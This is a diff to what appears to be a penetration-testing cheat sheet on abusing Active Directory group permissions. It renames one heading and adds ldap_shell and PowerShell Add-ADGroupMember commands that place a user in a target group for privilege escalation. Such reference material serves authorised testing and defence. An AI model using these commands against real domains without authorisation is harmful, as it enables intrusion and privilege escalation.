@@ -1,6 +1,6 @@
 # ACLs/ACEs permissions on Group
 
-### Self (Self-Membership) on Group / GenericAll/WriteProperty on Group/ WriteProperty (Self-Membership)
+### AddSelf (Self-Membership) on Group / GenericAll/WriteProperty on Group/ WriteProperty (Self-Membership)
 
 #### 1) Add group member
 
@@ -34,6 +34,16 @@
 
     $Cred
 
+#### 6) Ldap_shell
+
+    ldap_shell domain.local/USER1:Password@1 -dc-ip DC_IP
+    add_user_to_group USER1 "GROUP"
+
+#### 7) Active Directory Module
+
+    Get-Module -Name ActiveDirectory -ListAvailable
+    Import-Module -Name ActiveDirectory
+    Add-ADGroupMember -Identity 'GROUP' -Members 'USER1'
 
 ### WriteOwner on Group
 
